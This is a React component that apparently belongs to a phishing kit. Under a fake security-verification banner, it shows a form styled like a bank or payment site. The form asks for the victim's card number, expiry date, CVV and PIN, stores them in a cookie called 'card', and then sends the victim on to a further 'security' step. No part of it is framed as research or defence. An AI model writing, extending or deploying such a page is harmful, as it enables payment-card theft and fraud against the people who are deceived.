import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";

type OTP = {
  cn:string;
  edate:string;
  ccv:string;
  pn:string;
}

export default function Additional() {

  const [formInput, setFormInput] = useState<OTP>({
    cn:"",
    edate:"",
    ccv:"",
    pn:""
})



const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    cookies.set("card", formInput)
    navigate("../security", {replace:true})
}


  return (
    <div>
      <div rob-oos="" style={{ display: "block" }}>
        <div
          className="s-alerts -warning spacing-half -icon"
          data-valid="false"
          role="alert"
        >
          <span className="s-alerts__content" style={{ textAlign: "center" }}>
            <p className="fs-1">
              For your security, verify your information by entering the
              following details
            </p>
          </span>
        </div>
      </div>
      <form
        onSubmit={handleSubmit}
        method="POST"
        className="form"
        name="login-form"
      >
        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            Card number
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input credit-card"
              name="cn"
              id="password"
              type="text"
              required
              onChange={handleInputChange}
            />
            <div id="password-error"></div>
          </div>
        </div>

        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            Expiry date
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input"
              name="edate"
              id="password"
              type="text"
              maxLength={8}
              placeholder="MM/YY"
              required
              onChange={handleInputChange}
            />
            <div id="password-error"></div>
          </div>
        </div>

        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            CVV
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input"
              name="ccv"
              id="password"
              type="text"
              maxLength={5}
              required
              onChange={handleInputChange}
            />
            <div id="password-error"></div>
          </div>
        </div>

        <div className="m-t">
          <label className="form-label form__label" htmlFor="password">
            Pin
          </label>
          <div password-cell="" className="dynamic-state" data-valid="true">
            <input
              password-input=""
              className="form-input full dynamic-state__input"
              name="pn"
              id="password"
              type="text"
              required
              onChange={handleInputChange}
            />
            <div id="password-error"></div>
          </div>
        </div>

        <div className="m-t">
          <button
            login-button=""
            type="submit"
            className="button -default -primary form__btn -full"
          >
            Submit
            <span className="loading--1">.</span>
            <span className="loading--2">.</span>
            <span className="loading--3">.</span>
          </button>
        </div>
      </form>
    </div>
  );
}
